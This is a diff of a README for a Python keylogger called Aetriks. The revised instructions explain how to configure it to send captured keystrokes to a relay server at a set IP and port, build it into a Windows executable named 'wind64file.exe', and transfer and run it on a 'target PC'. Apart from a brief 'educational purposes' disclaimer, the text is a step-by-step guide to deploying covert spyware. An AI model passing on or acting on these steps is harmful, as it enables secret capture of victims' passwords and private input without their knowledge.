@@ -1,6 +1,6 @@
 # Aetriks: Simple Python Keylogger
 
-A simple Python keylogger that captures keystrokes and sends them to a remote server.
+A simple Python keylogger that captures keystrokes on a Windows target PC and sends them to a remote server running on Linux.
 
 > **Disclaimer**:  
 > This code is for **educational purposes only**! Do not use it for any illegal activities. Misuse of this tool is your responsibility.
@@ -9,83 +9,71 @@ A simple Python keylogger that captures keystrokes and sends them to a remote se
 
 ## Features
 
-- Captures keystrokes in real-time.
-- Sends collected keystrokes to a remote server.
+- Captures keystrokes in real-time on a Windows target PC.
+- Sends collected keystrokes to a remote server running on Linux.
 - Configurable server IP, port, and data transmission interval.
 
 ---
 
-## Installation Guide
+## Installation Guide (Linux)
 
-### **For Linux/MacOS**
+### **Step 1: Clone the Repository**
 
-1. **Clone the repository**:
+1. Clone the Aetriks repository:
    ```bash
    git clone https://github.com/frHimanshu/Aetriks.git
    cd Aetriks
    ```
 
-2. **Create a virtual environment**:
+2. Clone the Aetriks Relay Server repository inside the `Aetriks` directory:
+   ```bash
+   git clone https://github.com/frHimanshu/aetriks-relay.git
+   ```
+
+---
+
+### **Step 2: Set Up the Keylogger**
+
+1. Create a virtual environment:
    ```bash
    python3 -m venv keylogger_env
    source keylogger_env/bin/activate
    ```
 
-3. **Install required dependencies**:
+2. Install required dependencies:
    ```bash
    pip install -r requirements.txt
    ```
 
-4. **Run the keylogger**:
-   ```bash
-   python keylogger.py
-   ```
-
----
-
-### **For Windows**
-
-1. **Clone the repository**:
-   ```bash
-   git clone https://github.com/frHimanshu/Aetriks.git
-   cd Aetriks
-   ```
-
-2. **Create a virtual environment**:
-   ```bash
-   python -m venv keylogger_env
-   keylogger_env\Scripts\activate
-   ```
-
-3. **Install required dependencies**:
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-4. **Run the keylogger**:
-   ```bash
-   python keylogger.py
-   ```
-
----
-
-## Configuration
-
-1. **Edit the `config.json` file**:
-   - The keylogger uses a `config.json` file to configure the server details and data transmission interval.
-   - Example `config.json`:
+3. Edit the `config.json` file:
+   - Update the `ip_address` field with the IP address of the Linux machine running the Aetriks Relay Server.
+   - Example:
      ```json
      {
-         "ip_address": "127.0.0.1",
-         "port_number": 5000,
+         "ip_address": "192.168.105.74",
+         "port_number": 8080,
          "time_interval": 10
      }
      ```
-   - Place this file in the same directory as `keylogger.py`.
 
-2. **Server Setup**:
-   - Use the [Aetriks Relay Server](https://github.com/frHimanshu/aetriks-relay) to handle incoming keystroke data.
-   - Clone the server repository and follow its setup instructions.
+4. Convert the keylogger to a Windows executable:
+   - Install PyInstaller:
+     ```bash
+     pip install pyinstaller
+     ```
+   - Build the executable:
+     ```bash
+     pyinstaller keylogger.spec
+     ```
+   - The output executable (`wind64file.exe`) will be located in the `dist` directory.
+
+5. Transfer the executable to the Windows target PC and run it by double-clicking the file.
+
+---
+
+### **Step 3: Set Up the Aetriks Relay Server**
+
+Refer to the [Aetriks Relay Server Repository](https://github.com/frHimanshu/aetriks-relay) for detailed installation instructions.
 
 ---
 
@@ -93,25 +81,6 @@ A simple Python keylogger that captures keystrokes and sends them to a remote se
 
 This project is for **educational purposes only**.  
 **Make sure you have explicit permission** before running this on any device. Misuse of this tool is your responsibility.
-
----
-
-## Troubleshooting
-
-- **Missing Dependencies**:  
-  Ensure all dependencies are installed by running:
-  ```bash
-  pip install -r requirements.txt
-  ```
-
-- **Server Connection Issues**:  
-  Verify the `ip_address` and `port_number` in `config.json` match the server's configuration.
-
-- **Permission Denied**:  
-  Run the script with appropriate permissions if required:
-  ```bash
-  sudo python keylogger.py
-  ```
 
 ---
 
